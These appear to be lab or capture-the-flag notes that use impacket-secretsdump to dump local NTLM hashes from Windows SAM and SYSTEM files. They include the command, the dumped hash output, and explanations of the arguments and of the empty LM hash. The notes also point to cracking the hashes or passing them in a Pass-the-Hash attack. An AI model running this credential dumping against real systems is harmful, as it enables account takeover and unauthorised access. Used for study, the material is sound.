```
ls -la sam* system*
-rw-rw-r-- 1 kali kali    49152 Mar  9 05:43 sam
-rw-rw-r-- 1 kali kali 12279808 Mar  9 05:44 system

┌──(kali㉿kali)-[~]
└─$ impacket-secretsdump -system system -sam sam local               
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xbacf965a2426afda3d2207e4d6aa3904
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:156e3de3d13ba510e8c2b62f4f5d0216:::
Matt:1002:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
[*] Cleaning up... 

```


## impacket-secretsdump -sam sam -system system local

use Impacket's secretsdump module to dump the user NTLM hashes. 

The NTLM hash represents a cryptographic version of a user's plaintext password. 

Once retrieved, we could try to crack the hash or use it in a Pass-the-Hash attack to authenticate directly to the system without needing a plaintext password. 

To extract the hashes, we specify the following arguments: 

-sam : the path to the SAM file, which contains encrypted password data. 
-system : the path to the SYSTEM file, which contains the boot key required to decrypt the SAM file. 


local : indicates that the files are local and not being accessed remotely.

------

Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::

  

what is aad3b435b51404eeaad3b435b51404ee

`aad3b435b51404eeaad3b435b51404ee`, is the **empty or "null" LM (LAN Manager) hash**.

In a standard Windows hash output (like the one you got from `secretsdump`), the format is: `User : RID : LM Hash : NTLM Hash :::`


Seeing this string means that **LM hashing is disabled** on the system (which is the modern security standard).

- **The History:** Back in the day, Windows stored passwords using the weak LM algorithm. It was easy to crack because it split passwords into two 7-character chunks and converted them to uppercase.
    
- **The "Placeholder":** To maintain the format of the output string without actually storing a dangerous LM hash, Windows uses this specific "blank" constant as a placeholder.
    



For **Pass-the-Hash (PtH)** attack or for cracking, ignore that string and focus on the part after the second colon:

**`2b87e7c93a3e8a0ea4a581937016f341`**

This is the **NTLM hash** needed to authenticate as the Administrator.